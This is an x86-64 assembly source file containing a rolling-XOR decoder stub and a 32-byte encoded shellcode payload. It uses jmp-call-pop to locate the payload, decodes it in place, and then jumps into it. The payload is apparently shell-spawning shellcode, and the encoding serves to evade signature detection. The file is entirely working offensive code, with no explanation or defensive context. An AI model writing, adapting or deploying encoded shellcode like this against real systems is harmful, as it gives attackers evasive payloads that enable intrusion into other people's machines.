global _start

section .text
_start:
    jmp short get_address       ; jmp-call-pop for shellcode address

decoder:
    pop rdi                     ; address to encoded_shellcode
    push 31    
    pop rcx                     ; rolling-xor requires one less xor instruction 
    xor eax, eax                ; than the length of the shellcode

decode:
    mov eax, [rdi + rcx - 1]    ; first byte in xor (earlier of the two)
    xor byte [rdi + rcx], al    ; xor the byte above with the one that directly follows 
    loop decode                 ; the decoder works backwards 

jmp short encoded_shellcode     ; do the thing

get_address:
    call decoder
    encoded_shellcode: db 0x48,0x79,0xb9,0xe9,0xa1,0x28,0xca,0x82,0x39,0x16,0x74,0x1d,0x73,0x5c,0x73,0x0,0x68,0x3b,0x73,0xfa,0x1d,0x4d,0x1a,0x52,0xdb,0x3d,0x75,0xf6,0x36,0xd,0x2,0x7

